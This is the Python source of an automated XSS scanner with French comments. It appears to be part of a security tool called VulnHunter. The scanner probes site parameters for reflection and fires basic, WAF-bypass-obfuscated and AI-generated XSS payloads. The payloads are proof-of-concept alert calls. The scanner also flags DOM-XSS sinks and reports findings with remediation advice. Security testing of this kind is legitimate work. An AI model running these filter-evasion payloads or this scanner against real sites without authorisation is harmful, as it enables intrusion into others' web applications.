"""
Scanner XSS avec génération de payloads par IA et contournement de filtres
"""

import asyncio
import re
from typing import List, Optional, Dict
from urllib.parse import urlparse, parse_qs
from loguru import logger
import aiohttp
from html import unescape

from core.models import Vulnerabilite


class ScannerXSS:
    """
    Scanner XSS qui détecte:
    - XSS réfléchi
    - XSS stocké
    - XSS DOM-based
    - Contournement de filtres WAF
    """

    def __init__(self, client_ia, auth_config=None):
        """
        Initialise le scanner XSS
        
        Args:
            client_ia: Client IA pour génération de payloads
            auth_config: Configuration d'authentification (cookies, headers)
        """
        self.client_ia = client_ia
        self.auth_config = auth_config or {}
        self.cookies = self.auth_config.get('cookies', {})
        self.headers = self.auth_config.get('headers', {})
        self.parametre_vulnerable = None  # Stocke le paramètre vulnérable détecté
        
        # Payloads XSS de base (plus simples et efficaces)
        self.payloads_base = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "'\"><script>alert(1)</script>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "javascript:alert(1)",
            "<img src=x:alert(1)>",
            "<img src=x:prompt(1)>",
            "<img src=x:confirm(1)>",
        ]
        
        # Payloads avancés pour contournement
        self.payloads_contournement = [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<<SCRIPT>alert(1);//<</SCRIPT>",
            "<IMG SRC=j&#x61;vascript:alert(1)>",
            "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>",
            "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)>",
            "<IMG SRC=\"jav\\tascript:alert(1);\">",
            "<IMG SRC=\"jav&#x09;ascript:alert(1);\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert(1);\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert(1);\">",
        ]
        
        # Marqueurs pour détecter la réflexion
        self.marqueur = "VULNHUNTER_XSS_TEST_" + "".join([str(i) for i in range(10)])
        
        logger.info("Scanner XSS initialisé")

    async def scanner(self, url: str, parametres_decouverts: Dict[str, List[str]] = None) -> List[Vulnerabilite]:
        """
        Scan complet XSS - Teste plusieurs pages du site

        Args:
            url: URL à tester
            parametres_decouverts: Paramètres découverts automatiquement (optionnel)

        Returns:
            List[Vulnerabilite]: Vulnérabilités XSS trouvées
        """
        vulnerabilites = []

        try:
            logger.info(f"🔍 Scan XSS complet: {url}")

            # ⭐ PHASE 3: Utiliser les paramètres découverts si disponibles
            # Tester la page principale ET toutes les pages découvertes avec paramètres
            pages_a_tester = [url]  # Page principale
            
            # ⭐ PHASE 3: Ajouter les URLs avec paramètres découverts
            if parametres_decouverts and parametres_decouverts.get('urls_avec_params'):
                pages_a_tester.extend(parametres_decouverts['urls_avec_params'][:10])  # Max 10 URLs supplémentaires

            # ⭐ PHASE 3: Tester même sans réflexion détectée initialement - amélioré
            for page_url in pages_a_tester:
                try:
                    logger.debug(f"Test de réflexion sur: {page_url.split('/')[-1]}")
                    
                    # ⭐ NOUVEAU: Récupérer les paramètres découverts pour cette URL
                    params_page = parametres_decouverts.get('get', []) if parametres_decouverts else None
                    
                    # ⭐ PHASE 3: Augmenter la limite de paramètres testés (jusqu'à 50)
                    contexte = await self._detecter_contexte_reflexion(page_url, limite_params=50, parametres_decouverts=params_page)  # ⭐ Augmenté de 30 à 50

                    # ⭐ NOUVEAU: Tester même si contexte non détecté (peut être une XSS qui nécessite un payload spécifique)
                    if not contexte:
                        # Essayer quand même avec les paramètres découverts
                        if params_page:
                            logger.debug(f"⚠️  Pas de réflexion détectée, test direct avec {len(params_page)} paramètres découverts")
                            # Tester directement avec les paramètres découverts
                            vuln_direct = await self._tester_xss_direct(page_url, params_page)
                            if vuln_direct:
                                vulnerabilites.extend(vuln_direct)
                    else:
                        logger.success(f"🎯 Page vulnérable trouvée: {page_url.split('/')[-1]}")

                        # 2. Tests avec payloads de base
                        vuln_base = await self._tests_payloads_base(page_url, contexte)
                        if vuln_base:
                            vulnerabilites.extend(vuln_base)

                        # 3. Tests avec payloads d'obfuscation
                        vuln_obfus = await self._tests_obfuscation(page_url, contexte)
                        if vuln_obfus:
                            vulnerabilites.extend(vuln_obfus)

                        # 4. Tests avec payloads IA
                        vuln_ia = await self._tests_avec_ia(page_url, contexte)
                        if vuln_ia:
                            vulnerabilites.extend(vuln_ia)

                except Exception as e:
                    logger.debug(f"Erreur test page {page_url}: {str(e)}")
                    continue

            # 5. Test XSS DOM-based sur la page principale
            vuln_dom = await self._tests_dom_xss(url)
            if vuln_dom:
                vulnerabilites.append(vuln_dom)

            if vulnerabilites:
                logger.success(f"✅ {len(vulnerabilites)} XSS détecté(s) au total")
            else:
                logger.info("ℹ️  Aucune vulnérabilité XSS détectée")

            return vulnerabilites

        except Exception as e:
            logger.error(f"Erreur scan XSS: {str(e)}")
            return []

    async def _detecter_contexte_reflexion(self, url: str, limite_params: int = 10, parametres_decouverts: List[str] = None) -> Optional[str]:
        """
        Détecte si l'entrée est réfléchie et dans quel contexte

        Args:
            url: URL à tester
            limite_params: Nombre max de paramètres à tester
            parametres_decouverts: Paramètres découverts automatiquement (optionnel)

        Returns:
            str: Contexte (HTML, JS, attribut, etc.) ou None
        """
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            # Liste étendue de paramètres à tester systématiquement
            parametres_a_tester = []

            # 1. Paramètres existants dans l'URL
            if params:
                parametres_a_tester.extend(params.keys())

            # ⭐ NOUVEAU: Utiliser les paramètres découverts automatiquement
            if parametres_decouverts:
                parametres_a_tester.extend(parametres_decouverts)
            
            # 2. Paramètres courants (seulement si pas de paramètres découverts)
            if not parametres_a_tester:
                parametres_communs = [
                    'q', 'search', 'query', 'keyword', 'name',
                    'comment', 'message', 'text', 'content', 'input',
                    'id', 'user', 'username', 'email', 'term', 's'
                ]
                parametres_a_tester.extend(parametres_communs)

            # Dédupliquer
            parametres_a_tester = list(dict.fromkeys(parametres_a_tester))
            
            # ⭐ AMÉLIORATION: Limiter à limite_params mais être plus généreux
            if len(parametres_a_tester) > limite_params:
                logger.debug(f"⚡ Limitation à {limite_params} paramètres (sur {len(parametres_a_tester)} trouvés)")
                parametres_a_tester = parametres_a_tester[:limite_params]

            logger.info(f"🔍 Test de réflexion XSS sur {len(parametres_a_tester)} paramètres")

            async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                # Tester chaque paramètre avec un marqueur unique
                for param_name in parametres_a_tester:
                    try:
                        test_params = {param_name: self.marqueur}

                        async with session.get(
                            test_url,
                            params=test_params,
                            timeout=aiohttp.ClientTimeout(total=5),
                            allow_redirects=True
                        ) as response:
                            contenu = await response.text()

                            if self.marqueur in contenu:
                                # Déterminer le contexte
                                contexte = self._analyser_contexte(contenu, self.marqueur)
                                logger.success(f"✅ RÉFLEXION XSS DÉTECTÉE! Paramètre: '{param_name}' (contexte: {contexte})")

                                # Stocker le paramètre vulnérable pour les tests suivants
                                self.parametre_vulnerable = param_name
                                return contexte

                        await asyncio.sleep(0.05)  # Petit délai entre tests

                    except asyncio.TimeoutError:
                        logger.debug(f"⏰ Timeout test paramètre {param_name}")
                        continue
                    except Exception as e:
                        logger.debug(f"❌ Erreur test {param_name}: {str(e)}")
                        continue

            logger.debug("ℹ️  Aucune réflexion détectée avec marqueur, tests directs seront effectués")
            return None  # Retourner None mais les tests directs continueront

        except Exception as e:
            logger.error(f"💥 Erreur détection contexte XSS: {str(e)}")
            return None

    def _analyser_contexte(self, html: str, marqueur: str) -> str:
        """
        Analyse le contexte HTML où le marqueur apparaît
        
        Args:
            html: Contenu HTML
            marqueur: Marqueur recherché
            
        Returns:
            str: Type de contexte
        """
        # Trouver la position du marqueur
        pos = html.find(marqueur)
        if pos == -1:
            return "unknown"
        
        # Analyser avant le marqueur
        avant = html[max(0, pos-100):pos]
        apres = html[pos:min(len(html), pos+100)]
        
        # Dans une balise script
        if '<script' in avant.lower() and '</script>' in apres.lower():
            return "javascript"
        
        # Dans un attribut
        if avant.rstrip().endswith('="') or avant.rstrip().endswith("='"):
            return "attribute"
        
        # Dans un attribut sans quotes
        if '<' in avant and '>' not in avant.split('<')[-1]:
            return "attribute_unquoted"
        
        # Dans du HTML
        return "html"

    async def _tests_payloads_base(
        self, 
        url: str, 
        contexte: str
    ) -> List[Vulnerabilite]:
        """
        Tests avec les payloads de base
        
        Args:
            url: URL à tester
            contexte: Contexte de réflexion
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        # Utiliser le paramètre vulnérable détecté précédemment
        if not self.parametre_vulnerable:
            logger.debug("Pas de paramètre vulnérable identifié")
            return []
        
        parsed = urlparse(url)
        
        # Adapter les payloads au contexte
        payloads = self._adapter_payloads_au_contexte(
            self.payloads_base,
            contexte
        )
        
        async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Tester uniquement le paramètre vulnérable identifié
            for payload in payloads[:15]:  # Tester jusqu'à 15 payloads
                try:
                    test_params = {self.parametre_vulnerable: payload}
                    
                    async with session.get(
                        test_url,
                        params=test_params,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        contenu = await response.text()
                        
                        # Vérifier si le payload est présent sans échappement
                        if self._verifier_xss(contenu, payload):
                            logger.warning(f"⚠️  XSS trouvé avec: {payload[:50]}")
                            
                            # Construire l'URL complète avec le paramètre
                            url_complete = f"{test_url}?{self.parametre_vulnerable}={payload}"
                            
                            vuln = Vulnerabilite(
                                type="XSS",
                                severite="ÉLEVÉ",
                                url=url_complete,
                                description=f"XSS réfléchi dans le paramètre '{self.parametre_vulnerable}'",
                                payload=payload,
                                preuve=self._extraire_preuve_xss(contenu, payload),
                                cvss_score=7.3,
                                remediation="Échapper toutes les entrées utilisateur et implémenter CSP (Content Security Policy)"
                            )
                            vulnerabilites.append(vuln)
                            
                            # Une fois trouvé, on retourne (pas besoin de tester tous les payloads)
                            logger.success(f"✅ XSS confirmé sur {self.parametre_vulnerable}")
                            return vulnerabilites
                    
                    await asyncio.sleep(0.1)
                    
                except Exception as e:
                    logger.debug(f"Erreur test payload: {str(e)}")
                    continue
        
        return vulnerabilites

    async def _tests_obfuscation(
        self,
        url: str,
        contexte: str
    ) -> List[Vulnerabilite]:
        """
        Tests avec payloads obfusqués pour contournement de filtres
        
        Args:
            url: URL à tester
            contexte: Contexte de réflexion
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        # Utiliser le paramètre vulnérable détecté
        if not self.parametre_vulnerable:
            return []
        
        parsed = urlparse(url)
        
        async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            for payload in self.payloads_contournement[:10]:
                try:
                    test_params = {self.parametre_vulnerable: payload}
                    
                    async with session.get(
                        test_url,
                        params=test_params,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        contenu = await response.text()
                        
                        if self._verifier_xss(contenu, payload):
                            logger.success(f"🎯 XSS obfusqué réussi")
                            
                            url_complete = f"{test_url}?{self.parametre_vulnerable}={payload}"
                            
                            vuln = Vulnerabilite(
                                type="XSS",
                                severite="ÉLEVÉ",
                                url=url_complete,
                                description=f"XSS avec contournement de filtre dans '{self.parametre_vulnerable}'",
                                payload=payload,
                                preuve=self._extraire_preuve_xss(contenu, payload),
                                cvss_score=7.5,
                                remediation="Implémenter un WAF plus strict et échapper correctement toutes les entrées"
                            )
                            vulnerabilites.append(vuln)
                            return vulnerabilites
                    
                    await asyncio.sleep(0.1)
                    
                except Exception:
                    continue
        
        return vulnerabilites

    async def _tests_avec_ia(
        self,
        url: str,
        contexte: str
    ) -> List[Vulnerabilite]:
        """
        Tests avec payloads générés par l'IA
        
        Args:
            url: URL à tester
            contexte: Contexte de réflexion
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        # Vérifier si l'IA est disponible
        if not self.client_ia or not self.client_ia.disponible:
            logger.debug("IA non disponible - Tests XSS IA ignorés")
            return []
        
        # Utiliser le paramètre vulnérable détecté
        if not self.parametre_vulnerable:
            return []
        
        # Générer des payloads avec l'IA
        payloads_ia = await self.client_ia.generer_payloads_xss(
            contexte=contexte,
            filtres=None
        )
        
        if not payloads_ia:
            return []
        
        logger.info(f"Test de {len(payloads_ia)} payloads XSS générés par IA")
        
        parsed = urlparse(url)
        
        async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            for payload in payloads_ia[:15]:
                try:
                    test_params = {self.parametre_vulnerable: payload}
                    
                    async with session.get(
                        test_url,
                        params=test_params,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        contenu = await response.text()
                        
                        if self._verifier_xss(contenu, payload):
                            logger.success(f"🎯 XSS trouvé avec payload IA")
                            
                            url_complete = f"{test_url}?{self.parametre_vulnerable}={payload}"
                            
                            vuln = Vulnerabilite(
                                type="XSS",
                                severite="ÉLEVÉ",
                                url=url_complete,
                                description=f"XSS (IA) dans le paramètre '{self.parametre_vulnerable}'",
                                payload=payload,
                                preuve=self._extraire_preuve_xss(contenu, payload),
                                cvss_score=7.3,
                                remediation="Échapper toutes les entrées et implémenter CSP"
                            )
                            vulnerabilites.append(vuln)
                            return vulnerabilites
                    
                    await asyncio.sleep(0.1)
                    
                except Exception:
                    continue
        
        return vulnerabilites

    async def _tests_dom_xss(self, url: str) -> Optional[Vulnerabilite]:
        """
        Tests pour XSS DOM-based
        
        Args:
            url: URL à tester
            
        Returns:
            Vulnerabilite: Vulnérabilité si trouvée
        """
        try:
            async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    contenu = await response.text()
                    
                    # Rechercher des patterns dangereux dans le JavaScript
                    patterns_dangereux = [
                        r'document\.write\([^)]*location',
                        r'innerHTML\s*=\s*[^;]*location',
                        r'eval\([^)]*location',
                        r'document\.write\([^)]*document\.URL',
                        r'\.html\([^)]*location',
                    ]
                    
                    for pattern in patterns_dangereux:
                        if re.search(pattern, contenu, re.IGNORECASE):
                            logger.warning(f"⚠️  Pattern XSS DOM dangereux trouvé")
                            
                            match = re.search(pattern, contenu, re.IGNORECASE)
                            preuve = contenu[max(0, match.start()-50):min(len(contenu), match.end()+50)]
                            
                            return Vulnerabilite(
                                type="XSS",
                                severite="ÉLEVÉ",
                                url=url,
                                description="XSS DOM-based potentiel détecté",
                                payload="Voir le code JavaScript",
                                preuve=preuve,
                                cvss_score=7.0,
                                remediation="Valider et échapper les données avant utilisation dans le DOM"
                            )
        
        except Exception as e:
            logger.debug(f"Erreur test DOM XSS: {str(e)}")
        
        return None

    def _adapter_payloads_au_contexte(
        self,
        payloads: List[str],
        contexte: str
    ) -> List[str]:
        """
        Adapte les payloads au contexte détecté
        
        Args:
            payloads: Payloads de base
            contexte: Contexte d'injection
            
        Returns:
            List[str]: Payloads adaptés
        """
        if contexte == "javascript":
            return [
                "'; alert('XSS'); //",
                "\"; alert('XSS'); //",
                "'-alert('XSS')-'",
                "\"-alert('XSS')-\"",
            ]
        elif contexte == "attribute":
            return [
                "\" onload=\"alert('XSS')\"",
                "' onload='alert('XSS')'",
                "\" autofocus onfocus=\"alert('XSS')\"",
            ]
        elif contexte == "attribute_unquoted":
            return [
                "onload=alert('XSS')",
                "onfocus=alert('XSS') autofocus",
            ]
        
        return payloads

    async def _tester_xss_direct(self, url: str, parametres: List[str]) -> List[Vulnerabilite]:
        """
        Teste directement les paramètres avec des payloads XSS sans attendre la détection de réflexion
        
        Args:
            url: URL à tester
            parametres: Liste de paramètres à tester
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        if not parametres:
            return []
        
        parsed = urlparse(url)
        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        # ⭐ Payloads simples et efficaces pour test direct
        payloads_test = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "'\"><script>alert(1)</script>",
        ]
        
        async with aiohttp.ClientSession(cookies=self.cookies, headers=self.headers) as session:
            # ⭐ AMÉLIORATION: Tester plus de paramètres
            for param_name in parametres[:20]:  # Augmenté de 10 à 20 paramètres
                for payload in payloads_test:
                    try:
                        test_params = {param_name: payload}
                        
                        async with session.get(
                            test_url,
                            params=test_params,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            contenu = await response.text()
                            
                            # Vérifier si le payload est présent sans échappement
                            if self._verifier_xss(contenu, payload):
                                logger.warning(f"⚠️  XSS trouvé avec paramètre '{param_name}': {payload[:50]}")
                                
                                url_complete = f"{test_url}?{param_name}={payload}"
                                
                                vuln = Vulnerabilite(
                                    type="XSS",
                                    severite="ÉLEVÉ",
                                    url=url_complete,
                                    description=f"XSS réfléchi dans le paramètre '{param_name}'",
                                    payload=payload,
                                    preuve=self._extraire_preuve_xss(contenu, payload),
                                    cvss_score=7.3,
                                    remediation="Échapper toutes les entrées utilisateur et implémenter CSP (Content Security Policy)"
                                )
                                vulnerabilites.append(vuln)
                                
                                # Une fois trouvé pour ce paramètre, passer au suivant
                                break
                        
                        await asyncio.sleep(0.1)
                        
                    except Exception as e:
                        logger.debug(f"Erreur test XSS direct: {str(e)}")
                        continue
        
        return vulnerabilites

    def _verifier_xss(self, contenu: str, payload: str) -> bool:
        """
        Vérifie si le payload XSS est présent et non échappé
        
        Args:
            contenu: Contenu de la réponse
            payload: Payload testé
            
        Returns:
            bool: True si XSS détecté
        """
        # Normaliser le contenu et le payload
        contenu_lower = contenu.lower()
        payload_lower = payload.lower()
        
        # 1. Vérifier présence directe du payload complet
        if payload in contenu:
            logger.debug(f"✅ Payload complet présent: {payload[:50]}")
            return True
        
        # 2. Vérifier avec décodage HTML
        contenu_decode = unescape(contenu)
        if payload in contenu_decode:
            logger.debug(f"✅ Payload présent après décodage HTML")
            return True
        
        # 3. Vérifier les éléments critiques du payload
        elements_critiques = [
            ('<script', '</script>'),
            ('onerror=', None),
            ('onload=', None),
            ('onfocus=', None),
            ('onmouseover=', None),
            ('javascript:', None),
            ('<img', 'src='),
            ('<svg', 'onload='),
            ('<iframe', 'src='),
        ]
        
        for element, accompagnement in elements_critiques:
            if element in payload_lower:
                # Vérifier si l'élément est présent sans échappement
                if element in contenu_lower:
                    if accompagnement:
                        # Vérifier aussi l'accompagnement
                        if accompagnement in contenu_lower:
                            logger.debug(f"✅ Éléments critiques trouvés: {element} + {accompagnement}")
                            return True
                    else:
                        logger.debug(f"✅ Élément critique trouvé: {element}")
                        return True
        
        # 4. Vérifier si au moins 70% du payload est présent
        # (pour gérer les cas où des parties sont modifiées mais pas totalement bloquées)
        mots_payload = [m for m in payload_lower.split() if len(m) > 3]
        if mots_payload:
            mots_trouves = sum(1 for mot in mots_payload if mot in contenu_lower)
            taux_presence = mots_trouves / len(mots_payload)
            
            if taux_presence >= 0.7:
                # Vérifier aussi qu'il n'y a pas d'échappement HTML total
                if '&lt;' not in contenu or payload_lower.replace('<', '&lt;') not in contenu_lower:
                    logger.debug(f"✅ {int(taux_presence*100)}% du payload présent sans échappement complet")
                    return True
        
        return False

    def _extraire_preuve_xss(self, contenu: str, payload: str) -> str:
        """
        Extrait une preuve de la présence du XSS
        
        Args:
            contenu: Contenu de la réponse
            payload: Payload utilisé
            
        Returns:
            str: Preuve
        """
        pos = contenu.find(payload)
        if pos != -1:
            debut = max(0, pos - 100)
            fin = min(len(contenu), pos + len(payload) + 100)
            return contenu[debut:fin].strip()
        
        return f"Payload présent dans la réponse: {payload[:100]}"

